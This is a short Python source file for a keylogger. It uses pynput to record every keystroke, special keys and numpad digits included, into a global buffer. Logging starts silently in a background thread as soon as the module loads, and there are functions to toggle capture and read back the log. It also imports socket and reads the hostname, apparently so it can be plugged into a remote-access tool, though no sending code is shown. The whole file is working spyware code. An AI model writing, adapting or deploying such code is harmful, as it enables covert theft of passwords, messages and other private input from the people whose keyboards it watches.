from pynput import keyboard
import threading
import socket

data = ""
state = True
hostname = socket.gethostname()

def get_keylog_state():
    return state

def get_log():
    global data
    return data

def set_keylog_state(value: bool):
    global state
    state = value

def on_press(key):
    global data
    if state == True:
        # Handle special keys (like space, enter, etc.) as needed
        if key == keyboard.Key.space:
            data += (" ")
        elif key == keyboard.Key.enter:
            data += ("\n")
        elif key == keyboard.Key.tab:
            data += ("\t")
        elif "Key." in str(key):
            new_key = str(key).replace("Key.", "", 1)
            data += (" [" + new_key + "] ")
        elif 96 <= key.vk <= 105:
            data += (str(key.vk - 96))
        elif key.vk == 110:
            data += (".")
        # for normal keys and numbers
        elif "'" in str(key):
            data += (str(key)[1])
        else:
            data += (" [" + str(key) + "] ")

def start_keylogger():
    def keylog():
        # Collect events until released
        with keyboard.Listener(
                on_press=on_press) as listener:
            listener.join()
    threading.Thread(target=keylog, daemon=True).start()

start_keylogger()